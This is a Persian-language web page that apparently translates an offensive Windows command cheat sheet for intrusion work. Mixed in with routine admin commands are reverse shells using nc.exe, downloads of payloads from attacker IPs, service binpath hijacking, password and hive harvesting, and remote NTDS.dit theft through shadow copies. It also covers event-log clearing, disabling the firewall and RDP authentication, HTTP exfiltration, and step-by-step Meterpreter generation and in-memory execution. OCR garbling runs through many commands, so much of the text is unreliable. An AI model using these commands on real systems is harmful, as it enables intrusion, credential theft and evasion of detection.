---
layout: default
published: true
---

# ویندوز

## نسخه ها

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>شماره یا ID</b>
      </th>
      <th style="text-align:left"><b>نسخه ها</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">NT 3.1</td>
      <td style="text-align:left">Windows NT 3.1 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.5</td>
      <td style="text-align:left">Windows NT 3.5 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 3.51</td>
      <td style="text-align:left">Windows NT 3.51 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 4.0</td>
      <td style="text-align:left">Windows NT 4.0 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.0</td>
      <td style="text-align:left">Windows 2000 (All)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.1</td>
      <td style="text-align:left">Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 5.2</td>
      <td style="text-align:left">
        <p>Windows XP (64-bit, Pro 64-bit) Windows Server 2003 &amp; R2 (Standard,
          Enterprise)</p>
        <p>Windows Home Server</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.0</td>
      <td style="text-align:left">Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise,
        Ultimate)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.1</td>
      <td style="text-align:left">Windows 7 (Starter, Home, Pro, Enterprise, Ultimate) Windows Server 2008
        R2 (Foundation, Standard, Enterprise)</td>
    </tr>
    <tr>
      <td style="text-align:left">NT 6.2</td>
      <td style="text-align:left">Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)) Windows Phone 8
        Windows Server 2012 (Foundation, Essentials, Standard)</td>
    </tr>
  </tbody>
</table>

## فایل ها

| **دستور** | **توضیح** |
| :--- | :--- |
| %SYSTEMROOT% | معمولا C:\Windows |
| %SYSTEMROOT%\System32\drivers\etc\hosts | موجودیت های DNS |
| %SYSTEMROOT%\System32\drivers\etc\networks | تنظیمات شبکه |
| %SYSTEMROOT%  system32  config\SAM | نام کاربری و هش کلمه عبور |
| %SYSTEMROOT%\repair\SAM | کپی از SAM |
| %SYSTEMROOT%\System32\config\RegBack\SAM | تهیه پشتیبان از کپی SAM |
| %WINDIR%\system32\config\AppEvent.Evt | گزارشات برنامه ها |
| %WINDIR%\system32\config\SecEvent.Evt | گزارشات امنیت |
| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | مسیر راه انداز |
| %USERPROFILE%\Start Menu\Programs\Startup\ | مسیر راه انداز |
| %SYSTEMROOT%\Prefetch | مسیر Prefetch \(EXE گزارشات\) |

## مسیر های راه انداز

### برای WINDOWS NT 6.1,6.0

```text
# All users
%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 
# Specific users
%SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
```

### برای WINDOWS NT 5.2, 5.1, 5.0

```text
%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup
```

### برای WINDOWS 9x

```text
%SystemDrive%\wmiOWS\Start Menu\Programs\Startup
```

### برای WINDOWS NT 4. 0, 3. 51, 3. 50

```text
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\Startup
```

## دستورات اطلاعات سیستم



| **دستور** | **توضیح** |
| :--- | :--- |
| ver | نسخه سیستم عامل |
| sc query state=all | نمایش سرویس ها |
| tasklist /svc | نمایش فرآیند و سرویس ها |
| tasklist /m | نمایش کلیه فرآیند ها و dll ها |
| tasklist /S ip /v | فرآیند های در حال اجرا از راه دور |
| taskkill /PID pid /F | حذف اجباری فرآیند |
| systeminfo /S ip /U domain\user /P Pwd | دریافت اطلاعات سیستم از راه دور |
| reg query \\ ip \ RegDomain \  Key /v VALUE | ارسال پرس و جو به رجیستری, /s=all values |
| reg query HKLM /f password /t REG\_SZ /s | جست و جو رجیستری برای کلمه عبور ها |
| fsutil fsinfo drives | لیست درایور ها •نیاز به دسترسی admin |
| dir /a /s /b c:\'.pdf' | جست و جو برای کلیه فایل های pdf |
| dir /a /b c:\windows\kb' | جست و جو برای patche ها |
| findstr /si password' .txt I •.xmll •.xls | جست و جو در فایل های برای کلمه عبور ها |
| tree /F /A c: tree.txt | لیست فولدر های درایو C: |
| reg save HKLM\Security security.hive | ذخیره hive های امنیت درون فایل |
| echo %USERNAME% | کاربر جاری |
| whoami /priv | دسترسی های کاربر جاری |

## دستور net/domain



<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">net view /domain</td>
      <td style="text-align:left">هاست هاری دامین جاری </td>
    </tr>
    <tr>
      <td style="text-align:left">net view /domain: [MYDOMAIN]</td>
      <td style="text-align:left">هاست های در [MYDOMAIN]</td>
    </tr>
    <tr>
      <td style="text-align:left">net user /domain</td>
      <td style="text-align:left">کلیه کاربران دامین جاری</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user pass /add</td>
      <td style="text-align:left">اضافه نموده کاربر</td>
    </tr>
    <tr>
      <td style="text-align:left">net localgroup &quot;Administrators&quot; user /add</td>
      <td style="text-align:left">اضافه نموده کاربر به Administrator ها</td>
    </tr>
    <tr>
      <td style="text-align:left">net accounts /domain</td>
      <td style="text-align:left">سیاست های کلمه عبور دامین</td>
    </tr>
    <tr>
      <td style="text-align:left">net localgroup &quot;Administrators&quot;</td>
      <td style="text-align:left">لیست Admin های محلی</td>
    </tr>
    <tr>
      <td style="text-align:left">net group /domain</td>
      <td style="text-align:left">لیست گروه های دامنه</td>
    </tr>
    <tr>
      <td style="text-align:left">net group &quot;Domain Admins&quot; /domain</td>
      <td style="text-align:left">لیست کاربران Admin در دامین</td>
    </tr>
    <tr>
      <td style="text-align:left">net group &quot;Domain Controllers&quot; /domain</td>
      <td style="text-align:left">لیست DC ها برای دامین جاری</td>
    </tr>
    <tr>
      <td style="text-align:left">net share</td>
      <td style="text-align:left">محیط اشتراکی SMB</td>
    </tr>
    <tr>
      <td style="text-align:left">net session I find I &quot;\&quot;</td>
      <td style="text-align:left">لیست نشست های فعال SMB</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user /ACTIVE:yes /domain</td>
      <td style="text-align:left">گشودن دامین دامین</td>
    </tr>
    <tr>
      <td style="text-align:left">net user user &apos;&apos; newpassword &apos;&apos; /domain</td>
      <td style="text-align:left">تغییر نام کاربری و کلمه عبور دامین</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>net share share c:\share</p>
        <p>/GRANT:Everyone,FULL</p>
      </td>
      <td style="text-align:left">فولدر به اشتراک گذاشته شده</td>
    </tr>
  </tbody>
</table>

## دستورات از راه دور

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">tasklist /S ip /v</td>
      <td style="text-align:left">فرآیند های در حال اجرا در ip</td>
    </tr>
    <tr>
      <td style="text-align:left">systeminfo /S ip /U domain\user /P Pwd</td>
      <td style="text-align:left">اطلاعات مربوط به ip</td>
    </tr>
    <tr>
      <td style="text-align:left">net share \\ ip</td>
      <td style="text-align:left">محیط اشتراکی ip</td>
    </tr>
    <tr>
      <td style="text-align:left">net use \\ ip</td>
      <td style="text-align:left">فایل سیستم ip</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>net use z: \\ ip \share password</p>
        <p>/user: DOMAIN user</p>
      </td>
      <td style="text-align:left">
        <p>Map drive, specified</p>
        <p>credentials</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">reg add \\ ip \ regkey \ value</td>
      <td style="text-align:left">اضافه نموده کلید رجیستری برای ip</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>sc \\ ip create service</p>
        <p>binpath=C:\Windows\System32\x.exe start= auto</p>
      </td>
      <td style="text-align:left">
        <p>Create a remote service</p>
        <p>(space after start=)</p>
      </td>
    </tr>
     <tr>
      <td style="text-align:left">cmd.exe /c certutil -urlcache -split -f http://ip/nc.exe c:/windows/temp/nc.exe</td>
      <td style="text-align:left">کپی فایل از ip به سیستم جاری توسط cmd.exe</td>
    </tr>
    <tr>
      <td style="text-align:left">cmd.exe /c c:/windows/temp/nc.exe ip port -e cmd.exe</td>
      <td style="text-align:left">شل reverse</td>
    </tr>
    <tr>
      <td style="text-align:left">nc.exe -lvvp port</td>
      <td style="text-align:left">گوش دادن به port خاص </td>
    </tr>
    <tr>
      <td style="text-align:left">python3 -m http.server port</td>
      <td style="text-align:left">ایجاد وبسرور</td>
    </tr>
    <tr>
      <td style="text-align:left">xcopy /s \\ ip \dir C:\local</td>
      <td style="text-align:left">کپی از فودر ip</td>
    </tr>
    <tr>
      <td style="text-align:left">shutdown /m \\ ip /r /t 0 /f</td>
      <td style="text-align:left">راه اندازی مجدد سیستم با ip</td>
    </tr>
  </tbody>
</table>

## دستورات شبکه

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">ipconfig I all</td>
      <td style="text-align:left">تنظیمات ip</td>
    </tr>
    <tr>
      <td style="text-align:left">ipconfig /displaydns</td>
      <td style="text-align:left">حافظه نهان DNS</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -ana</td>
      <td style="text-align:left">بازنمودن ارتباط</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -anop tcp 1</td>
      <td style="text-align:left">ایجاد Netstat loop</td>
    </tr>
    <tr>
      <td style="text-align:left">netstat -ani findstr LISTENING</td>
      <td style="text-align:left">پورت های در حال استفاده</td>
    </tr>
    <tr>
      <td style="text-align:left">route print</td>
      <td style="text-align:left">جداول Route</td>
    </tr>
    <tr>
      <td style="text-align:left">arp -a</td>
      <td style="text-align:left">دریافت MAC های سیستم (با استفاده از جدول ARP)</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>nslookup, set type=any, ls -d domain</p>
        <p>results.txt, exit</p>
      </td>
      <td style="text-align:left">دریافت DNS Zone Xfer</td>
    </tr>
    <tr>
      <td style="text-align:left">nslookup -type=SRV _www._tcp.url.com</td>
      <td style="text-align:left">دریافت Domain SRV lookup ( ldap, kerberos, sip)</td>
    </tr>
    <tr>
      <td style="text-align:left">tftp -I ip GET remotefile</td>
      <td style="text-align:left">انتقال فایل در TFTP</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh wlan show profiles</td>
      <td style="text-align:left">پروفایل های ذخیره شده در شبکه بی سیم</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh firewall set opmode disable</td>
      <td style="text-align:left">غیر فعال سازی فایروال (&apos;Old)</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh wlan export profile folder=. key=clear</td>
      <td style="text-align:left">استخراج wifi به صورت plaintext</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip show interfaces</td>
      <td style="text-align:left">لیست IDs/MTUs مربوط به interface ها</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>netsh interface ip set address local static</p>
        <p>ip nmask gw ID</p>
      </td>
      <td style="text-align:left">تنظیم IP</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip set dns local static ip</td>
      <td style="text-align:left">تنظیم سرور DNS</td>
    </tr>
    <tr>
      <td style="text-align:left">netsh interface ip set address local dhcp</td>
      <td style="text-align:left">تنظیم interface برای استفاده از DHCP</td>
    </tr>
  </tbody>
</table>

## دستورات کاربردی



<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">type file</td>
      <td style="text-align:left">نمایش محتویات فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">del path \&apos; .&#x2022; /a /s /q /f</td>
      <td style="text-align:left">حذف فایل های در مسیر جاری</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>find /I &apos;&apos;str&apos;&apos; filename</p>
        <p>command I find /c /v &quot;&quot;</p>
      </td>
      <td style="text-align:left">لیست خروجی های cmd</td>
    </tr>
    <tr>
      <td style="text-align:left">at HH:MM file [args] (i.e. at 14:45 cmd /c)</td>
      <td style="text-align:left">زمان بندی اجرایی فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">runas /user: user &quot; file [args]&quot;</td>
      <td style="text-align:left">اجرای فایل با کاربر خاص</td>
    </tr>
    <tr>
      <td style="text-align:left">restart /r /t 0</td>
      <td style="text-align:left">راه اندازی مجدد</td>
    </tr>
    <tr>
      <td style="text-align:left">sc stop UsoSvc</td>
      <td style="text-align:left">توقف سرویس UsoSvc</td>
    </tr> 
    <tr>
      <td style="text-align:left">sc start UsoSvc</td>
      <td style="text-align:left">راه اندازی سرویس UsoSvc</td>
    </tr> 
    <tr>
      <td style="text-align:left">sc config UsoSvc binpath="c:\windows\temp\nc.exe ip port -e C:\windows\system32\cmd.exe"       </td>
      <td style="text-align:left">تغییر مسیر فایل اجرایی توسط UsoSvc</td>
    </tr> 
    <tr>
      <td style="text-align:left">tr -d &apos;\15\32&apos; win.txt unix.txt</td>
      <td style="text-align:left">حذف CR &amp; &apos;Z (&apos;nix)</td>
    </tr>
    <tr>
      <td style="text-align:left">makecab file</td>
      <td style="text-align:left">فشرده سازی</td>
    </tr>
    <tr>
      <td style="text-align:left">Wusa.exe /uninstall /kb: ###</td>
      <td style="text-align:left">حذف patch</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>cmd.exe &quot;wevtutil qe Application /c:40</p>
        <p>/f:text /rd:true&quot;</p>
      </td>
      <td style="text-align:left">استفاده از Event Viewer در CLI</td>
    </tr>
    <tr>
      <td style="text-align:left">lusrrngr.msc</td>
      <td style="text-align:left">استفاده از Local user manager</td>
    </tr>
    <tr>
      <td style="text-align:left">services.msc</td>
      <td style="text-align:left">استفاده از Services control panel</td>
    </tr>
    <tr>
      <td style="text-align:left">taskmgr.exe</td>
      <td style="text-align:left">استفاده از Task manager</td>
    </tr>
    <tr>
      <td style="text-align:left">secpool.rnsc</td>
      <td style="text-align:left">استفاده از Security policy manager</td>
    </tr>
    <tr>
      <td style="text-align:left">eventvwr.rnsc</td>
      <td style="text-align:left">استفاده از Event viewer</td>
    </tr>
  </tbody>
</table>## MISC. commands

### قفل نمودن workstation

```text
rundll32.dll user32.dll LockWorkstation 
```

### غیر فعال سازی فایروال ویندوز

```text
netsh advfirewall set currentprofile state off netsh advfirewall set allprofiles state off 
```

### ایجاد port forward \(\*نیاز به دسترسی admin\)

```text
netsh interface portproxy add v4tov4 listenport=3000 listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2 
#Remove
netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=l.l.l.l 
```

### فعال سازی cmd

```text
reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /t REG DWORD /d 0 /f 
```

## دستور PSEXEC

### اجرای فایل از راه دور با اطلاعات هویتی خاص

```text
psexec /accepteula \\ targetiP -u domain\user -p password -c -f \\ smbiP \share\file.exe 
```

### اجرای دستور با هش خاص

```text
psexec /accepteula \\ ip -u Domain\user -p Lt1 c:\Progra-1 
```

### اجرا دستور بر روی سیستم از راه دور

```text
psexec /accepteula \\ ip -s cmd.exe 
```

## سرویس Terminal \(RDP\)

### شروع RDP

```text
Create regfile.reg file with following line in it: HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService 
"fDenyTSCo~nections"=dword: 00000000
reg import reg file. reg 
net start ''terrnservice'' 
sc config terrnservice start= auto 
net start terrnservice 

    --OR--
reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control \Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### تونل RDP از پورت 443 \(نیاز به راه اندازی مجدد سرویس terminal\)

```text
REG ADD "HKLt1\System\CurrentControlSet\Control \Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
```

### حذف احراز هویت شبکه با اضافه نمودن exception در فایروال

```text
reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f 

netsh firewall set service type = remotedesktop mode = enable 
```

### وارد نمودن task از فایل XML

```text
schtasks.exe /create /tn t1yTask /xml "C:\MyTask.xml" /f
```

## دستور WMIC

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">wmic [alias] get /?</td>
      <td style="text-align:left">لیست کلیه ویژگی ها</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic [alias] call /?</td>
      <td style="text-align:left">متد Callable</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic process list full</td>
      <td style="text-align:left">ویژگی های فرآیند ها</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic startupwmic service</td>
      <td style="text-align:left">شروع سرویس wmic</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic ntdomain list</td>
      <td style="text-align:left">اطلاعات دامین و DC</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic qfe</td>
      <td style="text-align:left">لیست کلیه patches</td>
    </tr>
    <tr>
      <td style="text-align:left">wrnic process call create &quot;process_name&quot;</td>
      <td style="text-align:left">اجرای فرآیند</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>wmic process where name=&quot;process&quot; call</p>
        <p>terminate</p>
      </td>
      <td style="text-align:left">حذف فرآیند</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic logicaldisk get description,name</td>
      <td style="text-align:left">نمایش محیط اشتراکی منطقی</td>
    </tr>
    <tr>
      <td style="text-align:left">wmic cpu get DataWidth /format:list</td>
      <td style="text-align:left">نمایش نسخه 32 بیتی یا 64 بیتی سیستم</td>
    </tr>
   <tr>
      <td style="text-align:left">wmic service where started = true get name, startname</td>
      <td style="text-align:left">نمایش سرویس های اجرا شده</td>
    </tr>
  </tbody>
</table>

### WMIC \[alias\] \[where\] \[clause\]

```text
[alias] == process, share, startup, service, nicconfig, useraccount, etc. 
[where] ==where (name="cmd.exe"), where (parentprocessid!=[pid]"), etc. 
[clause] ==list [fulllbrief], get [attribl, attrib2], call [method], delete
```

### اجرا فایل در smb با اطلاعات هویتی خاص

```text
wmic /node: targetiP /user:domain\user /password:password process call create "\ \ smbiP \share\evil.exe" 
```

### حذف نرم افزار

```text
wmic product get name /value # Get software names 
wmic product where name="XXX" call uninstall /nointeractive 
```

###  دسترسی به کاربر از راه دور

```text
wmic /node:remotecomputer computersystern get username 
```

### نمایش فرآیند ها به صورت لحظه ای

```text
wmic /node:machinename process list brief /every:l 
```

### شروع RDP

```text
wmic /node:"machinename 4" path Win32_TerminalServiceSetting where 
AllowTSConnections=''O'' call SetAllowTSConnections ''1''
```

### لیست زمان هایی که کاربر وارد شده

```text
wmic netlogin where (name like "%adm%") get numberoflogons 
```

### جست و جو سرویس ها برای مسیر های unquoted

```text
wmic service get narne,displayname,pathnarne,startrnode 
| findstr /i nauton | findstr /i /v "C:\windows\\" | findstr /i /v """
```

### کپی از Volume shadow

```text
1. wmic /node: DC IP /user:"DOI1AIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin list shadows 2 &1 
   c:\temp\output.txt" 
# If any copies alread1 ex~st then exfil, otherwise create using 
following commands. Check output.txt for anJ errors 
2. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c vssadmin create shadow /for=C: 2 &1 
   C:\temp\output.txt" 
3. wmic /node: DC IP /user:"DOMAIN\user" /password:"PASS" process 
   call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVol~meShadowCopy1\Windows\System32\co nfig\SYSTEM 
   C:\temp\system.hive 2 &1  
   C:\temp\output.txt" 
4. wmic /node: DC IP /user: "DOl'.llUN\user" /password: "PASS" process call create ''cmd /c copy 
   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit 
   C:\temp\ntds.dit 2 &1 C:\temp\output.txt" 
Step by step instructions on room362.com for step below 
5. From Linux, download and run ntdsxtract and libesedb to export 
   hashes or other domain information 
   a. Additional instructions found under the VSSOWN section 
   b. ntdsxtract - http://www.ntdsxtract.com 
   c. libesedb - http://code.google.com/p/libesedb/ 
```

## محیط POWERSHELL

| **Command** | **Description** |
| :--- | :--- |
| stop-transcript | توقف ضبط |
| get-content file | نمایش محتویات فایل |
| get-help command -examples | نمایش نمونه دستور |
| get-command  'string' | جست و جو برای cmd |
| get-service | نمایش سرویس ها \(stopservice, start-service\) |
| get-wmiobject -class win32 service |نمایش سرویس ها به همان اطلاعات هویتی |
| $PSVesionTable | نمایش نسخه powershell |
| powershell.exe -version 2.0 |اجرای powershell 2.0 از نسخه 3.0 |
| get-service measure-object | اطلاعات برگشت داده شده از سرویس |
| get-psdrive | لیست برگشت داده شده از PSDrives |
| get-process select -expandproperty name |نمایش نام ها |
| get-help ' -parameter credential | دریافت اطلاعات هویتی |
| get-wmiobject -list -'network' | WMI موجود در شبکه |
| \(Net.DNS\]: :GetnostEntry\(" ip "I | فرآیند DNS Lookup |
| powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | دریافت و ذخیره سازی فایل |

### حذف گزارشات امنیت و برنامه ها\(برای SVR01\)

```text
Get-EventLog -list 
Clear-EventLog -logname Application, Security -computername SVR01 
```

### استخراج نسخه سیستم عامل در درون فایل CSV

```text
Get-WmiObject -class win32 operatingsystem | select -property ' | 
export-csv c:\os.txt
```

### لیست سرویس های در حال اجرا

```text
Get-Service | where_object {$_.status -eq "Running"} 
```

### استفاده از psdrive برای اشتراگ گذاری دائم

```text
New-PSJrive -Persist -PSProvider FileSjstem -Root \\1.1.1.1\tools -Name i 
```

### فایل های نوشته شده در تاریخ 8/20

```text
Get-Childitem -Path c:\ -Force -Rec~rse -Filter '.log -ErrorAction
SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"} 
```

### دریافت فایل از http

```text
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'') 
```

### اتصالات پورت tcp\(پویشگر\)

```text
$ports=(#,#,#) ;$ip="x.x.x.x";foreach ($port in $ports) {try
($socket=New-bject Sjstem.Net.Sockets.TCPClient($ip,$port); }catch(};
if ($socket -eq $NULL) (echo $ip":"$port"- Closed";}
else(echo $ip":"$port"- Open";$socket =$NULL;}}
```

### دستور Ping با 500 millisecond timeout

```text
$ping = New-Object Sjstex.Net.Networkinformation.ping 
$ping.Send('' ip '',5JO) 
```

### پنجره Basic authentication

```text
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass 
$Host.UI.PromptForCredential(" title "," message "," user" "," domain") 
```

### اجرای فایل exe \(از cmd.exe\)هر 4 ساعت بین تاریخ 8-11 آگوست 2013 وسایت 0800-1700

```text
powershell. exe -Command "do {if ((Get-Date -format yyyyMMdd-HHmm) -match
'201308 ( 0 [ 8-9] |1 [0-1])-(0[ 8-9]]|1 [ 0-7]) [ 0-5] [ 0-9]') {Start-Process -
WindowStyle Hidden "C:\Temp\my.exe";Start-Sleep -s 14400))while(1)" 
```

### اجرای Powershell به عنوان

```text
$pw ~ convertto-securestring -string "PASSWORD" -asplaintext -force;
$pp ~ new-object -typename System.Management.Automation.PSCredential - 
argument list "DOMAIN\user", $pw;
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command 
&{Start-Process file.exe -verb runas)' 
```

### ارسال کننده Email

```text
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject 
"Subject" -a " attachment file path " -body "Body" -SmtpServer Target
Email Server IP 
```

### فعال سازی دسترسی از راه دور به powershell \(نیاز به اطلاعات هویتی\)

```text
net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
Enter-PSSession -ComputerName ip -Credential username 
```

### لیست hostname و ip برای کلیه دامین ها

```text
Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class 
MicrosoftDNS _ ResourceRecord -Filter "domainname~' DOMAIN '" | select 
textrepresentation 
```

### دانلود از Powershell از مسیر خاص

```text
powershell.exe -noprofile -noninteractive -command 
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $source="""https:ll YOUR SPECIFIED IP I file.zip """; 
$destination="C:\rnaster.zip"; $http = new-object Systern.Net.WebClient;
$response= $http.DownloadFile($source, $destination);" 
```

### نمایش داده های Powershell 

```text
Script will send a file ($filepath) via http to server ($server) via POST request. 
Must have web server listening on port designated in the $server
 
powershell.exe -noprofile -noninteractive -command 
"[S;stem.Net.ServicePointManager] ::ServerCertificateValidationCallback = 
{$true); $server="""http:// YOUR_SPECIFIED IP / folder """;
$filepath="C:\master.zip" $http= new=object System.Net.WebClient;
$response= $http.UploadFile($server,$filepath);" 
```

## استفاده از powershell برای اجرای meterpreter از memory

```text
Need Metasploit v4.5+ (msfvenom supports Powershell) 
Use Powershell (x86) with 32 bit Meterpreter payloads 
encodeMeterpreter.psl script can be found on next page 
```

### در سیستم حمله کننده

```text
1. ./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=1.1.1.1 LPORT=443 audit.psl 
2. Move audit.psl into same folder as encodeMeterpreter.psl 
3. Launch Powershell (x86) 
4. powershell.exe -executionpolicy bypass encodeMeterpreter.psl 
5. Copy the encoded Meterpreter string
```

### شروع listener در سیستم حمله کننده

```text
1. ./msfconsole 
2. use exploit/multi/handler 
3. set payload windows/meterpreter/reverse https 
4. set LHOST 1. 1. 1. 1 
5. set LPORT 443 
6. exploit -j 
```

### در سیستم هدف \(اجرای powershell\(x86\)\)

```text
1. powershell. exe -noexi t -encodedCommand paste encoded Meterpreter 
string here 
PROFIT 
```

### Encodemeterpreter.ps1 \[7\]

```text
# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]: :Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)
$contents I ForEach-Object {$sw.WriteLine($ I)
$sw.Close()
# Base64 Encode Stream
$code= [Convert]: :ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object
IO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream
(, '$ ( [Convert] : : FromBase64String ('"$code'") ) I I ,
[IO.Compression.Compressiont~ode]: :Decompress) I,
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding] ::Unicode.GetBytes($command)
$encodedCommand = [Convert]: :ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand
```

Copyright 2012 TrustedSec, LLC. All rights reserved.   
Please see reference \[7\] for disclaimer

## استفاده از powersehll برای راه اندازی meterpreter \(روش دوم\)

### On bt attack box

```text
1. msfpayload windows/rneterpreter/reverse tcp LHOST=10.1.1.1
LPORT~8080 R I msfencode -t psh -a x86
```

### در سیستم حمله کننده

```text
1. c:\ powershell
2. PS c:\ $cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE '
3. PS c:\ $u = [System.Text.Encoding]: :Unicode.GetBytes($crnd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e
```

### شروع listener در سیستم حمله کننده

```text
1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j
```

### در سیستم هدف \(1:دانلود شل کد, 2:اجرا\)

```text
1.  c: \ powershell -noprofile -noninteracti ve -command " &
    {$client=new-object
    System.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt
    ', 'c:\windows\temp\ shell.txt') )"
2.  c: \ powershell -noprofile -noninteracti ve -noexi t -command " &
    {$crnd~tjpe 'c:\windows\temp\ shell.txt';powershell -noprofilenoninteractive
    -noexit -encodedCornmand $cmd} "
PROFIT
```

## رجیستری ویندوز 

### اطلاعات سیستم عامل

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion
```

### نام محصول

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v
ProductNarne
```

### تاریخ نصب  

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
```

### نام ثبت شده

```text
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
```

### اطلاعات بوت سیستم

```text
HKLM\Software\~icrosoft\Windows NT\CurrentVersion /v SystemRoot
```

### اطلاعات Time zone \(بر حسب دقیقه از utc\)

```text
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTirneBias
```

### نقشه درایور های شبکه

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive
MRU
```

### دستگاه های mounte شده 

```text
HKLM\System\MountedDevices
```

### دستگاه های usb

```text
HKLM\System\CurrentControlSet\Enurn\USBStor
```

### فعال سازی IP forwarding

```text
HKEY_LOCAL_~ACHI~E\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -
IPEnableRouter = 1
```

